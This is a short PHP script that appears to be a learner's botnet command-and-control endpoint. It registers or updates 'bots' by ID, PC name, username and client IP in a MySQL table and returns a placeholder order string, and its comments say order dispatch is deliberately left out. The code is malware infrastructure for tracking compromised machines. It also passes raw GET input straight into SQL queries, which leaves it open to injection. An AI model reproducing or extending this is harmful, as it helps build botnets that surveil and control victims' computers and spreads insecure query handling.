<?php
if (!isset($_GET["a"])){die;} //is the field set? also possible with _POST fields. But Get is easier to understand and you can work with the url.
if (!isset($_GET["b"])){die;} //is the field set?
if (!isset($_GET["c"])){die;} //is the field set?


$db = new mysqli("localhost", "root", "", "simplebot"); //connect to simplebot db
if (mysqli_connect_errno()){die;} //error connecting to mysql?

$result = $db->query("SELECT * FROM `bots` WHERE `ID` LIKE '" . $_GET["a"] . "'"); //Get bot from db

if (!$result->fetch_assoc()) { //bot doesn't exist? insert him.
	$db->query("INSERT INTO `bots` (`ID`, `PC-Name`, `Username`, `Timestamp`, `IP`) VALUES ('" . $_GET["a"] . "', '" . $_GET["b"] . "', '" . $_GET["c"] . "', CURRENT_TIMESTAMP, '" . ip2long($_SERVER['REMOTE_ADDR']) . "')");
} else { //else update
	$db->query("UPDATE `bots` SET `PC-Name` = '" . $_GET["b"] . "', `Username` = '" . $_GET["c"] . "', `Timestamp` = CURRENT_TIMESTAMP, `IP` = '" . ip2long($_SERVER['REMOTE_ADDR']) . "' WHERE `bots`.`ID` = '" . $_GET["a"] . "' LIMIT 1");
}

echo "this could be some bot-order..."; //return value can be read to receive some orders... won't do this ;) learning by doing. the winsock command is called recv();

unset($result); //cleanup
unset($db);
return;
?>